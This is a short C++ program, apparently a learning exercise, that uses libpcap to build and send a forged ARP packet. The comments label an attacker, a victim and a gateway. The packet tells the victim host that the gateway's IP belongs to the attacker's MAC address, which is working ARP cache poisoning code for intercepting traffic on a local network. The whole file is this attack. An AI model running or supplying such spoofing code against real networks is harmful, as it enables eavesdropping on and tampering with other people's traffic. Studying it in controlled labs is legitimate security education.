#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
	printf("syntax: send-arp-test <interface>\n");
	printf("sample: send-arp-test wlan0\n");
}

int main(int argc, char* argv[]) {
	if (argc != 2) {
		usage();
		return -1;
	}

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, 0, 0, 0, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

	EthArpPacket packet;

//attaker;s mind
	packet.eth_.dmac_ = Mac("00:0f:00:00:05:b3");//victim's mac
	packet.eth_.smac_ = Mac("00:0f:00:c0:3d:a8");//attaker's mac
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Request);
	packet.arp_.smac_ = Mac("00:0f:00:c0:3d:a8");//attacker's mac
	packet.arp_.sip_ = htonl(Ip("172.20.10.1"));//gateway
	packet.arp_.tmac_ = Mac("00:0f:00:00:05:b3");//victim's mac
	packet.arp_.tip_ = htonl(Ip("172.20.10.4"));//victim's ip

	//usually use gateway's ip for target ip cuz it has important packets
	//First we have to knoow about victim's mac by arp table
	//So we have to send and get some packets

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}

	pcap_close(handle);
}
